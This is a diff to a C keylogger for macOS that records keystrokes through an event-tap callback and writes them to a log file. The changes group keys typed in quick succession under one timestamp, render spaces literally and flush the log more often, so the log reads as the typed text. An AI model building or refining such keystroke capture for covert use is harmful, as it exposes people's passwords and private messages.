@@ -4,6 +4,7 @@
 
 FILE *logFile = NULL;
 int counter = 0;
+time_t lastTime;
 
 char* keyCodeToReadableString (CGKeyCode);
 CGEventRef myCGEventCallback (CGEventTapProxy, CGEventType, CGEventRef, void *);
@@ -41,14 +42,19 @@ CGEventRef myCGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRe
   if (logFile) {
     time_t currentTime;
     time(&currentTime);
-    struct tm *time_info = localtime(&currentTime);
+
+    if(currentTime - lastTime > 5){
+        struct tm *time_info = localtime(&currentTime);
+        char fmtTime[32];
+        strftime(fmtTime, 32, "%F %T", time_info);
+        fprintf(logFile, "\n%s %s", fmtTime, keyCodeToReadableString(keyCode));
+    }else{
+        fprintf(logFile, "%s", keyCodeToReadableString(keyCode));
+    }
     
-    char fmtTime[32];
-    strftime(fmtTime, 32, "%F %T", time_info);
-    
-    fprintf(logFile, "%s %s\n", fmtTime, keyCodeToReadableString(keyCode));
-    
-    if (counter % 100 == 0) fflush(logFile);
+    if (counter % 50 == 0) fflush(logFile);
+
+    time(&lastTime);
   }
   return event;
 }
@@ -123,7 +129,7 @@ char* keyCodeToReadableString (CGKeyCode keyCode) {
     case  92: return "<keypad-9>";
     case  36: return "<return>";
     case  48: return "<tab>";
-    case  49: return "<space>";
+    case  49: return " ";
     case  51: return "<delete>";
     case  53: return "<escape>";
     case  55: return "<command>";
